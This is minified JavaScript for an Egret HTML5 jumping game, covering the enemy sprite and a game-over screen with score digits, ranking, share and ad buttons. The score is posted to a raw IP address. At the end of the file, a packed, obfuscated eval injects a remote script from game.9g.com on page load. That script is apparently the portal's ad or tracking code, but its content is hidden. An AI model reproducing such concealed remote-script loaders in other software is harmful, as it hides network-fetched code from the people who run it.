			this.removeEventListener(egret.Event.ENTER_FRAME, this.enemy_move, this)
		};
		c.speed = 0.5;
		return c
	}
	(egret.Bitmap);
	d.Enemy = e;
	e.prototype.__class__ =
		"jump.Enemy"
})(jump || (jump = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.winwidth = egret.MainContext.instance.stage.stageWidth;
			this.winhight = egret.MainContext.instance.stage.stageHeight;
			this.timer = new egret.Timer(1E4, 1);
			this.center_x = this.winwidth / 2;
			this.center_y = 3 * this.winhight / 5;
			this.temp_x = 0;
			this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this)
		}
		__extends(c, e);
		c.prototype.onAddToStage = function () {
			this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
			this.init_encourage();
			this.init_ranking();
			this.init_display();
			this.init_bar();
			this.init_replay()
		};
		c.prototype.init_encourage = function () {
			this.encourage = new egret.Bitmap(GameApp.other_sheet.getTexture("encourage"));
			this.encourage.anchorX = 0.5;
			this.encourage.x = this.stage.stageWidth / 2;
			this.encourage.y = this.stage.stageHeight / 8;
			this.addChild(this.encourage)
		};
		c.prototype.init_ranking = function () {
			this.ranking = new egret.Bitmap(GameApp.other_sheet.getTexture("ranking"));
			this.ranking.anchorX = 0.5;
			this.ranking.anchorY = 0.5;
			this.ranking.x =
				this.stage.stageWidth / 2;
			this.ranking.y = 5 * this.stage.stageHeight / 15;
			this.addChild(this.ranking);
			this.ranking.touchEnabled = !0;
			this.ranking.addEventListener(egret.TouchEvent.TOUCH_TAP, this.onGetComplete, this)
		};
		c.prototype.open_rangking = function () {
			this.myhttp = new egret.URLRequest;
			this.myhttp.data = d.GameContainer.best_score;
			this.myhttp.method = egret.URLRequestMethod.POST;
			this.myhttp.url = "http://42.121.113.35/test/paihang.php";
			this.myloader = new egret.URLLoader;
			this.myloader.dataFormat = egret.URLLoaderDataFormat.TEXT;
			this.myloader.addEventListener(egret.Event.COMPLETE, this.onGetComplete, this);
			this.myloader.load(this.myhttp)
		};
		c.prototype.onGetComplete = function (a) {
			a = a.target.data;
			this.statusGetLabel.text = "\u83b7\u5f97GET\u54cd\u5e94! ";
			this.statusGetLabel.text += "\nGET\u54cd\u5e94: \n" + a.toString();
			this.ranking.removeEventListener(egret.TouchEvent.TOUCH_TAP, this.open_rangking, this);
			this.removeChildren();
			a = new d.Ramking;
			this.addChild(a);
			a.addEventListener("back_face", this.back_face, this)
		};
		c.prototype.back_face = function () {
			this.removeChildren();
			this.init_encourage();
			this.init_ranking();
			this.init_display();
			this.init_bar();
			this.init_replay();
			this.set_x();
			!0 == this.newrecord.visible && this.addChild(this.newrecord)
		};
		c.prototype.init_display = function () {
			this.display = new egret.Bitmap(GameApp.other_sheet.getTexture("moon_cake"));
			this.display.anchorX = 0.5;
			this.display.x = this.stage.stageWidth / 2 - this.display.width / 2;
			this.display.y = 11 * this.stage.stageHeight / 15;
			this.addChild(this.display);
			this.display.touchEnabled = !0;
			this.display.addEventListener(egret.TouchEvent.TOUCH_TAP,
				dp_share, this)
		};
		c.prototype.init_share = function () {
			this.share = new egret.Bitmap(GameApp.bigmap_sheet.getTexture("share"));
			this.addChild(this.share);
			this.init_x();
			this.share.touchEnabled = !0;
			this.timer.addEventListener(egret.TimerEvent.TIMER_COMPLETE, this.remove_share, this);
			this.timer.reset();
			this.timer.start()
		};
		c.prototype.remove_share = function () {
			this.timer.removeEventListener(egret.TimerEvent.TIMER_COMPLETE, this.remove_share, this);
			this.timer.stop();
			this.share.touchEnabled = !1;
			this.share.visible =
				!1;
			this.removeChild(this.share);
			this.removeChild(this.temp_xx);
			this.init_ad()
		};
		c.prototype.init_x = function () {
			this.temp_xx = new egret.Bitmap(GameApp.other_sheet.getTexture("x_menu"));
			this.addChild(this.temp_xx);
			this.temp_xx.addEventListener(egret.TouchEvent.TOUCH_TAP, this.x_remove_share, this);
			this.temp_xx.anchorX = 0.5;
			this.temp_xx.anchorY = 0.5;
			this.temp_xx.x = this.temp_xx.width / 2;
			this.temp_xx.y = this.temp_xx.height / 2;
			this.temp_xx.touchEnabled = !0
		};
		c.prototype.x_remove_share = function () {
			this.timer.removeEventListener(egret.TimerEvent.TIMER_COMPLETE,
				this.x_remove_share, this);
			this.timer.stop();
			this.share.touchEnabled = !1;
			this.temp_xx.touchEnabled = !1;
			this.share.visible = !1;
			this.temp_xx.visible = !1;
			this.removeChild(this.share);
			this.removeChild(this.temp_xx)
		};
		c.prototype.init_ad = function () {
			this.ad_menu = new egret.Bitmap(GameApp.bigmap_sheet.getTexture("share"));
			this.addChild(this.ad_menu);
			this.ad_menu.touchEnabled = !0;
			this.ad_menu.addEventListener(egret.TouchEvent.TOUCH_TAP, this.to_ad, this)
		};
		c.prototype.to_ad = function () {
			this.removeChild(this.ad_menu);
			this.ad_menu.removeEventListener(egret.TouchEvent.TOUCH_TAP, this.to_ad, this);
			window.location.href = "http://game.9g.com";
		};
		c.prototype.init_bar = function () {
			this.bar = new egret.Bitmap(GameApp.other_sheet.getTexture("bar"));
			this.bar.anchorX = 0.5;
			this.bar.x = this.stage.stageWidth / 2;
			this.bar.y = 6 * this.stage.stageHeight / 15;
			this.addChild(this.bar)
		};
		c.prototype.init_replay = function () {
			this.replay = new egret.Bitmap(GameApp.other_sheet.getTexture("replay"));
			this.replay.anchorX = 0.5;
			this.replay.x = this.stage.stageWidth /
				2 + this.replay.width / 2;
			this.replay.y = 11 * this.stage.stageHeight / 15;
			this.replay.touchEnabled = !0;
			this.addChild(this.replay);
			this.replay.addEventListener(egret.TouchEvent.TOUCH_TAP, this.rm_face, this)
		};
		c.prototype.rm_face = function () {
			this.dispatchEventWith("REPLAY")
		};
		c.prototype.set_x = function () {
			this.one_w = new egret.Bitmap(GameApp.other_sheet.getTexture("big_0"));
			this.big_m = new egret.Bitmap(GameApp.other_sheet.getTexture("big_m"));
			if (0 == this.temp_x % 2)
				for (var a = this.temp_x / 2 - 1, b = 0; b < this.temp_num.length; b++)
					this.temp_num[b].x =
						b <= a ? this.center_x + this.one_w.width / 2 + (a - b) * this.one_w.width - this.big_m.width / 2 : this.center_x - this.one_w.width / 2 - (b - a - 1) * this.one_w.width - this.big_m.width / 2, this.addChild(this.temp_num[b]);
			else
				for (a = Math.ceil(this.temp_x / 2) - 1, b = 0; b < this.temp_num.length; b++)
					this.temp_num[b].x = b < a ? this.center_x + (a - b) * this.one_w.width - this.big_m.width / 2 : b == a ? this.center_x - this.big_m.width / 2 : this.center_x - (b - a) * this.one_w.width - this.big_m.width / 2, this.addChild(this.temp_num[b]);
			this.big_m.anchorX = 0.5;
			this.big_m.anchorY =
				0.5;
			this.big_m.y = this.temp_num[0].y;
			this.big_m.x = this.temp_num[0].x + this.temp_num[0].width / 2 + this.big_m.width / 2;
			this.addChild(this.big_m)
		};
		c.prototype.creat_num = function (a) {
			a = new egret.Bitmap(a);
			a.anchorX = 0.5;
			a.anchorY = 0.5;
			a.y = this.center_y;
			this.temp_num.push(a)
		};
		c.prototype.overscore = function (a) {
			this.temp_num = [];
			for (var b = a.toString(), c = this.temp_x = b.length; 0 <= c; c--)
				switch (b[c]) {
				case "0":
					this.creat_num(GameApp.other_sheet.getTexture("big_0"));
					break;
				case "1":
					this.creat_num(GameApp.other_sheet.getTexture("big_1"));
					break;
				case "2":
					this.creat_num(GameApp.other_sheet.getTexture("big_2"));
					break;
				case "3":
					this.creat_num(GameApp.other_sheet.getTexture("big_3"));
					break;
				case "4":
					this.creat_num(GameApp.other_sheet.getTexture("big_4"));
					break;
				case "5":
					this.creat_num(GameApp.other_sheet.getTexture("big_5"));
					break;
				case "6":
					this.creat_num(GameApp.other_sheet.getTexture("big_6"));
					break;
				case "7":
					this.creat_num(GameApp.other_sheet.getTexture("big_7"));
					break;
				case "8":
					this.creat_num(GameApp.other_sheet.getTexture("big_8"));
					break;
				case "9":
					this.creat_num(GameApp.other_sheet.getTexture("big_9"))
				}
			this.set_x();
			this.comparescore(a)
		};
		c.prototype.creatnewrecord = function () {
			this.newrecord = new egret.Bitmap(GameApp.other_sheet.getTexture("new_record"));
			this.newrecord.anchorX = 0.5;
			this.newrecord.anchorY = 0.5;
			this.newrecord.x = this.winwidth / 2;
			this.newrecord.y = this.center_y;
			this.addChild(this.newrecord);
			this.newrecord.visible = !1
		};
		c.prototype.comparescore = function (a) {
			this.creatnewrecord();
			a > d.GameContainer.best_score ? (d.GameContainer.best_score =
					a, this.newrecord.visible = !0) : this.newrecord.visible = !1;
					 
			dp_submitScore(a);
		};
		return c
	}
	(egret.DisplayObjectContainer);
	d.GameOver = e;
	e.prototype.__class__ = "jump.GameOver"
})(jump || (jump = {}));
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(1(){2 a=3.p(\'4\');a.e=\'d/c\';a.h=g;a.f=\'6://9.8.7/m/o.k\';2 b=3.n(\'4\')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();',26,26,'|function|var|document|script|parentNode|http|com|9g|game|||javascript|text|type|src|true|async|onload|insertBefore|js|removeChild|zqcs|getElementsByTagName||createElement'.split('|'),0,{}))